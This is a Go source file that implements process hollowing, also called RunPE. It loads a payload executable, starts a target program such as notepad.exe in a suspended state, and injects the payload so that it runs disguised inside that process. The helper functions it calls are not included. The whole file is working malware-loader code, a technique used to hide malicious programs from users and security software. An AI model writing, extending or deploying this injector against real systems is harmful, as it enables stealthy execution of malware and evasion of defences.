package main

import (
	"fmt"
	"log"
	"syscall"
)

//HollowProcess func
func HollowProcess(payloadPath, targetPath string) bool {
	//payloadPath := `test.exe`
	//targetPath := `C:\Windows\SysWOW64\notepad.exe`

	//1. Load the payload:
	var payloadImageSize uint64
	// Load the current executable from the file with the help of libpeconv:
	loadedPE := LoadPEModule(payloadPath, &payloadImageSize, false, false)
	fmt.Printf("Loaded_PE size: %d\n", payloadImageSize)
	fmt.Printf("Loaded_PE ptr: %X\n", loadedPE)

	if loadedPE == 0 {
		log.Println("Loading failed!")
		return false
	}

	// Get the payload's architecture and check if it is compatibile with the loader:
	payloadArch := GetNTHdrArch(loadedPE)
	fmt.Printf("Paylod_arch: %#x\n", payloadArch)

	if payloadArch != IMAGE_NT_OPTIONAL_HDR32_MAGIC && payloadArch != IMAGE_NT_OPTIONAL_HDR64_MAGIC {
		log.Println("Not supported payload architecture!")
		return false
	}

	is32BitPayload := !Is64Bit(loadedPE)

	// 2. Prepare the taget
	isTargComp := IsTargetCompatible(loadedPE, payloadImageSize, targetPath)

	if !isTargComp {
		FreePEBuffer(loadedPE, payloadImageSize)
		return false
	}

	// Create the target process (suspended):
	var pi syscall.ProcessInformation
	isCreated := CreateSuspendedProcess(targetPath, &pi)
	fmt.Printf("Suspended process created in GO: %t ProcessID: %d\n", isCreated, pi.ProcessId)

	if !isCreated {
		log.Println("Creating target process failed!")
		FreePEBuffer(loadedPE, payloadImageSize)
		return false
	}

	//3. Perform the actual RunPE:
	//Test _run_pe
	isOK := _RunPE(loadedPE, payloadImageSize, &pi, is32BitPayload)

	//4. Cleanup:
	if !isOK {
		//if injection failed, kill the process
		TerminateProcess(pi.ProcessId)
	}
	//Test free_pe_buffer
	FreePEBuffer(loadedPE, payloadImageSize)
	syscall.CloseHandle(pi.Thread)
	syscall.CloseHandle(pi.Process)
	//---
	return isOK
}
